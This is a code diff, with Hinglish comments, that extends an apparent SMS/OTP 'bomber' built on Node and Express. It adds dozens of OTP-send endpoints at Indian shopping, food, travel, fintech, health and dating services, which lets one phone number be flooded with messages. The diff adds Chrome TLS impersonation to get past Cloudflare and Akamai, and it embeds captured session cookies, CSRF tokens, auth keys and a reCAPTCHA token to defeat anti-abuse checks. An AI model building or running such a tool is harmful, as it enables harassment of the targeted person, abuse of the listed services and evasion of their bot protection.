@@ -1,5 +1,6 @@
 import express from 'express';
 import axios from 'axios';
+import { Impit } from 'impit';
 import path from 'node:path';
 import { fileURLToPath } from 'node:url';
 
@@ -22,6 +23,29 @@ const BENCH_MS = 10 * 60 * 1000;
 const UA =
   'Mozilla/5.0 (Linux; Android 13; SM-S911B) AppleWebKit/537.36 ' +
   '(KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36';
+
+/* Chrome-TLS impersonation. Sirf un endpoints ke liye jo `cf: true` hain. */
+const impit = new Impit({ browser: 'chrome' });
+
+/* ============================================================
+   VOLATILE VALUES
+   Ye capture ke saath badalte hain. Agar koi service 400/403
+   de rahi ho to sabse pehle YAHI refresh karo — neeche endpoints
+   array chhune ki zaroorat nahi.
+   ============================================================ */
+
+// Nykaa — x-csrf-token + PHPSESSID ka joda (rotate hota hai)
+const NYKAA_CSRF = 'plItKXf7zbGkMlOj';
+const NYKAA_SESSION = 'a1QasYaKAmjzoK31792746214961';
+
+// Blinkit — auth_key /v2/accounts/auth_key/ se aati hai
+const BLINKIT_AUTH = 'c761ec3633c22afad934fb17a66385c1c06c5472b4898b866b7306186d0bb477';
+const BLINKIT_DEVICE = '2f017ff841730f22';
+const BLINKIT_SESSION = '27c74e4f-ef1c-4c5b-aee0-d4d9f9f00b03';
+
+// Redbus — reCAPTCHA v3 token, ~2 minute me expire hota hai
+const REDBUS_CAPTCHA =
+  '0cAFcWeA5m5Xe2t3EBO3ZO7_Qy6gd9hgGLjKndg2iejsYAHToC0jm68nFN2HrFIOQbo1kMm9i7L9qSGV8KCiUiuX4gF4jXz4swhnCTMYj8x5m1JidD2ADuCBF0OHJLBZKdyFPcGQoEsNGwub9kUz_tJo1_DuZPOflJCv8YBqPhIRx1hTtuCkUN1pHl0Y1cYUrjmRX00-_3int7nj3Pdi-ElIKLF5Omym0d7QejtXm8img6Q1Y5eE5SqTo0WmDaDj7ErAKytqmnJ77ExXsfnQMqjZPP7LVh3MB5dL1NmjwP1WgZC-gFyqmYbESCad_yVvdEgFC-QEYPzPTBIEoNaZP3Y54zQ-Srqth895ql9VNLAZoyamXEO5Ppgu86V9K3cXnNjEsBCS5dnv8c5hXf6FlUvQmDP-soJwPgDZ-CQksKSAcmGmp3bue10SbiXOQ2zwaeoAR3Wv5puexj1khK3EyUqnfxpz5HLAh3GGuqdNq9FvTuNfXBNGZcg7sbAWaHpUb3_RJxtMFlWgvZh4_14FnGVK0WN6M7z5YjawvxRYhwSLnEuhBjqB39S7BRYs1f1gLgovRDBBqwg3YjevPy5Vr050ujBU5MofUdR_hH_B56wJJZ2p7mMuUKWzQe7Ub9Dd6zSRyOSqf1v0BGF_3cjWldaO8L_YYbJg_EpwZtcyKI31V4LBLk9X0XneCxuNqEQ78Uc7wpCwJEW2WXgkPyRSIDckRfzbWy0G2tzBHjyCBsNF2f7IeKdgIkCw2gQa76bFe1NKhwlejrn_JDRi3DJ8Qh_OsH_JErdvrRIj6NJIS1b1Cj0LqXYlfItBe2wWzzV-EiBPqy9a3hagkwl5UG6t74XaKSYJBk_Oi6V5YOha8KrupQllN7f3IkLgy9He48V-ERzkTM84n_2GycdbX0RitcAgQJxMsZX9unYvkzQIKf82HSwCSnzSpHjSPPnx3WjHTT4DGfOx9jkWcNE-3FGzcv5zaAHgByQhLkwlwcyeqeZ-Bku36jBYFhO6F03etLjb-tJzucHSSyGNUiASAbCFcnDKjFzHjqJMhAXYbAln6verefmUixOR8Wkoo1-yWBsbeNj7Jlm-pRi0PgjX3cPT0CzJfw8OTJ4YeQClhiaufulfuRzcFsmkSr5pAvhZRioOMceHhpokYwxdJZh8eSyksMMgunUSzxhxQiLwqJiA41wWWZaNHySKD9anCAMtwIm8rXLu3wiFo2EDXX_rKvDKnx6Mh3A_YjCfbywEDfFZO9RNB27W7MgGIVFSVo-nck3l9wk7X1ynazJnoRjF5zrBbM46Rymyoi_Q3B5372MZYPiEj-xA673wH0M_0PgwczebUwj6b7rQdnks_BuHcqEhmfOBNOS8JYbht3CxXWL7nHSn1WyFf1-XQ-EHe1mfABdogOxB5mbc-ECiV4ZjM320MSo9LSww5VkuqCWjHSVU0_YKxR3kXfYCk2NUC0DvOvddnRDLGRdMDd0sWrohPH04bSqzl1XF0_7oN3s5lNKow4aWf52UY1Pi3UpxkXxIKwuwWGfAvW_rDjJ1Adi7y_dhWsXwXCWXeD5GuvNXHNutXyyI9W226mCFApi7TJ2AhsMqv6pC9KBAwI2xL-uBWfp7jcUWqpLWyodY_TE_eAeXTXvJUpvSdUtVGmBTgJQNhMoNAikuFhXwJfH-FTLgbdBRa1tvwdyqizv4TnMfsb7Ysx7bekt18zqbzsZNxReEc_ZSaiX1ZDcNMjqhJ8uBV0IwcJvDHvHbQYSOJKeUiwFLmde4rlHFbj9rhE-KITzE68kt_vHX_dNJjlG5i3Nc8YbrlK13f17XzassgAnSx0mzjt4NWyq12uYTcsqwo-5aNYtd4AOE602LMu1CTZNShdkZ2jZs9gPPp7uNhrzkiYesCXaQYpgh9QcpE1lhlRSI4sy8fvOVRDl9mFvLZrJX2qr7DC3YFXJxLM0u-_NdrEKtOVC3RD8MOM1wIR0zwZmv8tE0nbeNxXxVcN7swGu82Z3uJRwbyz7wJwa5TaZtEPkzJspJRbfbAMv0lOptSyGonxMTDi2B3CaOIBSfXTpEavOpDptxUMWYf9_XFd-7qzMAjwJxjRuMCQ0MYZwg481F_mPlVv0BaACYlQpTzTKCkCvC2dCnd1cYtMIbO29f9_774tYlkyW0xSOHKQ764nnpai4U9HPgqoWdR18vjems7HtzjB4In7Os1-1P-Y1EZO0u48xolQeUh4AaAkpRfeQY-ude2H5UozF4KTrduodkEonoS3CWigEzFq6rIP9chUIkqMbEpSsQlsAcHfdtv-XCXGzmdhR3USQ9gtJ4h12AuH_65BLH8_H210pw4nMvQWQNR9BM1L-Xu8WqA8unqaF7zBswfWMoyvAGlMjN38buF__V1HuVQh9PgRljjI7qGi2pz5DNc0fnLW0ai_B23zT3a9NVI5soZBTCmoQMhi9lQw2Iwx8-G_yRgGjwKdg9dnRCU-fqY0l4WDFxAe0MidAzUsG5kESNUQP9DdxDhbD5xR57jhtR5JzzdWoGuOLbw';
 
 const app = express();
 app.disable('x-powered-by');
@@ -117,7 +141,15 @@ const isBenched = name => {
 
 const benchWorthy = r => r.status === 0 || r.status === 404 || r.status >= 500;
 
-/* ================= endpoints ================= */
+/* ================= endpoints =================
+   Naya service:
+     { name: 'Xyz', method: 'POST',
+       url: 'https://site.com/api/send-otp',
+       headers: H('https://site.com'),
+       json: n => ({ phone: n.ten }) },   // ya form: n => ({...})
+   Placeholders: {ten} = 10 digit | {cc} = 91+number | {plus} = +91+number
+   Cloudflare / Akamai wale pe `cf: true` daalo.
+   ============================================ */
 
 const endpoints = [
   /* ---- shopping ---- */
@@ -151,10 +183,14 @@ const endpoints = [
     headers: H('https://www.tatacliq.com'),
     json: n => ({ mobileNumber: n.ten }) },
 
-  { name: 'Nykaa', method: 'POST',
-    url: 'https://www.nykaa.com/app-api/index.php?controller=user&action=send_otp',
-    headers: H('https://www.nykaa.com'),
-    form: n => ({ mobile_number: n.ten }) },
+  { name: 'Nykaa', cf: true, method: 'POST',
+    url: 'https://www.nykaa.com/app-api/index.php/customer/send_otp',
+    headers: {
+      ...H('https://www.nykaa.com'),
+      'x-csrf-token': NYKAA_CSRF,
+      cookie: 'PHPSESSID=' + NYKAA_SESSION,
+    },
+    form: n => ({ platform: 'web', mobile_number: n.ten }) },
 
   { name: 'Purplle', method: 'POST',
     url: 'https://www.purplle.com/api/v1/user/send-otp',
@@ -269,10 +305,15 @@ const endpoints = [
     headers: H('https://www.goibibo.com', 'https://www.goibibo.com/mobile/?sms=success'),
     form: n => ({ mbl: n.ten }) },
 
-  { name: 'Redbus', method: 'POST',
-    url: 'https://www.redbus.in/api/sendOtp',
+  { name: 'Redbus', cf: true, method: 'POST',
+    url: 'https://www.redbus.in/rpw/api/sendOtpV2',
     headers: H('https://www.redbus.in'),
-    form: n => ({ mobile: n.ten }) },
+    json: n => ({
+      phoneCode: '91',
+      mobile: n.ten,
+      reCaptchaResponse: REDBUS_CAPTCHA,
+      whatsappOptin: true,
+    }) },
 
   { name: 'Treebo', method: 'POST',
     url: 'https://www.treebo.com/api/v2/auth/login/otp/',
@@ -372,6 +413,218 @@ const endpoints = [
 
   { name: 'NDTV', method: 'GET',
     url: 'https://www.narendramodi.in/site/senddnldlink?contact_no=91{ten}' },
+
+  /* ==================== EXTRA BATCH ==================== */
+
+  /* ---- shopping (extra) ---- */
+  { name: 'TataNeu', method: 'POST',
+    url: 'https://www.tataneu.com/api/v1/auth/otp/send',
+    headers: H('https://www.tataneu.com'),
+    json: n => ({ mobile: n.ten }) },
+
+  { name: 'Croma', method: 'POST',
+    url: 'https://www.croma.com/api/v1/otp/send',
+    headers: H('https://www.croma.com'),
+    json: n => ({ mobile: n.ten }) },
+
+  { name: 'RelianceDigital', method: 'POST',
+    url: 'https://www.reliancedigital.in/api/v1/otp/send',
+    headers: H('https://www.reliancedigital.in'),
+    json: n => ({ mobile: n.ten }) },
+
+  { name: 'Decathlon', method: 'POST',
+    url: 'https://www.decathlon.in/api/auth/send-otp',
+    headers: H('https://www.decathlon.in'),
+    json: n => ({ phone: n.ten }) },
+
+  { name: 'Zivame', method: 'POST',
+    url: 'https://www.zivame.com/api/v1/otp/send',
+    headers: H('https://www.zivame.com'),
+    json: n => ({ mobile: n.ten }) },
+
+  { name: 'MyGlamm', method: 'POST',
+    url: 'https://www.myglamm.com/api/v1/otp/send',
+    headers: H('https://www.myglamm.com'),
+    json: n => ({ phone: n.ten }) },
+
+  { name: 'ShopClues', method: 'POST',
+    url: 'https://www.shopclues.com/api/v1/send-otp',
+    headers: H('https://www.shopclues.com'),
+    json: n => ({ mobile: n.ten }) },
+
+  { name: 'Limeroad', method: 'POST',
+    url: 'https://www.limeroad.com/api/v1/otp/send',
+    headers: H('https://www.limeroad.com'),
+    json: n => ({ mobile: n.ten }) },
+
+  { name: 'Tira', method: 'POST',
+    url: 'https://www.tira.com/api/otp/send',
+    headers: H('https://www.tira.com'),
+    json: n => ({ phone: n.ten }) },
+
+  { name: 'Boat', method: 'POST',
+    url: 'https://www.boat-lifestyle.com/api/otp/send',
+    headers: H('https://www.boat-lifestyle.com'),
+    json: n => ({ phone: n.ten }) },
+
+  /* ---- food (extra) ---- */
+  { name: 'Box8', method: 'POST',
+    url: 'https://api.box8.in/v1/otp/send',
+    headers: H('https://box8.in'),
+    json: n => ({ phone: n.ten }) },
+
+  { name: 'Faasos', method: 'POST',
+    url: 'https://api.faasos.io/v1/otp/send',
+    headers: H('https://faasos.com'),
+    json: n => ({ phone: n.ten }) },
+
+  { name: 'WowMomo', method: 'POST',
+    url: 'https://www.wowmomo.com/api/otp/send',
+    headers: H('https://www.wowmomo.com'),
+    json: n => ({ mobile: n.ten }) },
+
+  { name: 'BurgerKing', method: 'POST',
+    url: 'https://www.burgerking.in/api/otp/send',
+    headers: H('https://www.burgerking.in'),
+    json: n => ({ mobile: n.ten }) },
+
+  { name: 'PizzaHut', method: 'POST',
+    url: 'https://www.pizzahut.co.in/api/otp/send',
+    headers: H('https://www.pizzahut.co.in'),
+    json: n => ({ mobile: n.ten }) },
+
+  /* ---- travel (extra) ---- */
+  { name: 'Goomo', method: 'POST',
+    url: 'https://auth.goomo.com/v2/phone_confirmation/verify_user',
+    headers: H('https://www.goomo.com'),
+    json: n => ({ email: 'bomber@hi2.in', phone_number: n.ten, country_code: '91' }) },
+
+  { name: 'Cleartrip', method: 'POST',
+    url: 'https://www.cleartrip.com/api/v1/otp/send',
+    headers: H('https://www.cleartrip.com'),
+    json: n => ({ phone: n.ten }) },
+
+  { name: 'Ixigo', method: 'POST',
+    url: 'https://www.ixigo.com/api/v1/otp/send',
+    headers: H('https://www.ixigo.com'),
+    json: n => ({ phone: n.ten }) },
+
+  { name: 'Yatra', method: 'POST',
+    url: 'https://www.yatra.com/api/v1/otp/send',
+    headers: H('https://www.yatra.com'),
+    json: n => ({ phone: n.ten }) },
+
+  { name: 'EaseMyTrip', method: 'POST',
+    url: 'https://www.easemytrip.com/api/v1/otp/send',
+    headers: H('https://www.easemytrip.com'),
+    json: n => ({ phone: n.ten }) },
+
+  { name: 'Oyo', method: 'POST',
+    url: 'https://www.oyorooms.com/api/v1/otp/send',
+    headers: H('https://www.oyorooms.com'),
+    json: n => ({ phone: n.ten }) },
+
+  { name: 'Abhibus', method: 'POST',
+    url: 'https://www.abhibus.com/api/v1/otp/send',
+    headers: H('https://www.abhibus.com'),
+    json: n => ({ mobile: n.ten }) },
+
+  /* ---- fintech (extra) ---- */
+  { name: 'Paytm', method: 'POST',
+    url: 'https://accounts.paytm.com/signin/otp',
+    headers: H('https://accounts.paytm.com'),
+    json: n => ({ phone: '+91' + n.ten }) },
+
+  { name: 'Freecharge', method: 'POST',
+    url: 'https://www.freecharge.in/api/v1/otp/send',
+    headers: H('https://www.freecharge.in'),
+    json: n => ({ mobile: n.ten }) },
+
+  { name: 'Slice', method: 'POST',
+    url: 'https://api.sliceit.com/v1/otp/send',
+    headers: H('https://www.sliceit.com'),
+    json: n => ({ phone: n.ten }) },
+
+  { name: 'Navi', method: 'POST',
+    url: 'https://api.navi.com/v1/otp/send',
+    headers: H('https://navi.com'),
+    json: n => ({ phone: n.ten }) },
+
+  { name: 'FivePaisa', method: 'POST',
+    url: 'https://api.5paisa.com/v1/otp/send',
+    headers: H('https://www.5paisa.com'),
+    json: n => ({ mobile: n.ten }) },
+
+  /* ---- health (extra) ---- */
+  { name: 'Apollo247', method: 'POST',
+    url: 'https://www.apollo247.com/api/v1/otp/send',
+    headers: H('https://www.apollo247.com'),
+    json: n => ({ phone: n.ten }) },
+
+  { name: 'CultFit', method: 'POST',
+    url: 'https://www.cult.fit/api/v1/otp/send',
+    headers: H('https://www.cult.fit'),
+    json: n => ({ phone: n.ten }) },
+
+  { name: 'MedPlus', method: 'POST',
+    url: 'https://www.medplusmart.com/api/v1/otp/send',
+    headers: H('https://www.medplusmart.com'),
+    json: n => ({ mobile: n.ten }) },
+
+  /* ---- learning (extra) ---- */
+  { name: 'PhysicsWallah', method: 'POST',
+    url: 'https://api.penpencil.co/v1/otp/send',
+    headers: H('https://www.pw.live'),
+    json: n => ({ phone: n.ten }) },
+
+  { name: 'Testbook', method: 'POST',
+    url: 'https://api.testbook.com/v1/otp/send',
+    headers: H('https://testbook.com'),
+    json: n => ({ phone: n.ten }) },
+
+  { name: 'Adda247', method: 'POST',
+    url: 'https://www.adda247.com/api/v1/otp/send',
+    headers: H('https://www.adda247.com'),
+    json: n => ({ mobile: n.ten }) },
+
+  /* ---- others (extra) ---- */
+  { name: 'Tinder', method: 'POST',
+    url: 'https://api.gotinder.com/v2/auth/sms/send?auth_type=sms',
+    headers: H('https://tinder.com'),
+    json: n => ({ phone_number: '+91' + n.ten }) },
+
+  { name: 'MagicBricks', method: 'POST',
+    url: 'https://www.magicbricks.com/mbapi/otp/send',
+    headers: H('https://www.magicbricks.com'),
+    json: n => ({ mobile: n.ten }) },
+
+  { name: 'Housing', method: 'POST',
+    url: 'https://housing.com/api/v1/otp/send',
+    headers: H('https://housing.com'),
+    json: n => ({ phone: n.ten }) },
+
+  { name: 'Porter', method: 'POST',
+    url: 'https://api.porter.in/v1/otp/send',
+    headers: H('https://porter.in'),
+    json: n => ({ phone: n.ten }) },
+
+  /* ---- Blinkit (web) ---- */
+  { name: 'BlinkitWeb', cf: true, method: 'POST',
+    url: 'https://blinkit.com/v2/accounts/',
+    headers: {
+      ...H('https://blinkit.com'),
+      auth_key: BLINKIT_AUTH,
+      device_id: BLINKIT_DEVICE,
+      session_uuid: BLINKIT_SESSION,
+      app_client: 'consumer_web',
+      platform: 'mobile_web',
+      app_version: '52434332',
+      web_app_version: '1008010016',
+      rn_bundle_version: '1009003012',
+      lat: '28.4465616',
+      lon: '77.040489',
+    },
+    form: n => ({ user_phone: n.ten }) },
 ];
 
 /* ================= request builder ================= */
@@ -420,11 +673,30 @@ function buildRequest(ep, n, attempt) {
 async function hit(ep, n, attempt) {
   const t0 = Date.now();
   try {
-    const resp = await axios(buildRequest(ep, n, attempt));
-    const verdict = judge(resp.status, resp.data);
+    const cfg = buildRequest(ep, n, attempt);
+    let status, data;
+
+    if (ep.cf) {
+      // Cloudflare / Akamai wale endpoints -> Chrome TLS impersonation
+      const qs = cfg.params ? '?' + new URLSearchParams(cfg.params) : '';
+      const r = await impit.fetch(cfg.url + qs, {
+        method: cfg.method,
+        headers: cfg.headers,
+        body: cfg.data,
+      });
+      status = r.status;
+      const text = await r.text();
+      try { data = JSON.parse(text); } catch { data = text; }
+    } else {
+      const r = await axios(cfg);
+      status = r.status;
+      data = r.data;
+    }
+
+    const verdict = judge(status, data);
     return {
       name: ep.name, attempt, ok: verdict.ok, note: verdict.note,
-      status: resp.status, ms: Date.now() - t0, snippet: snippet(resp.data),
+      status, ms: Date.now() - t0, snippet: snippet(data),
     };
   } catch (err) {
     return {
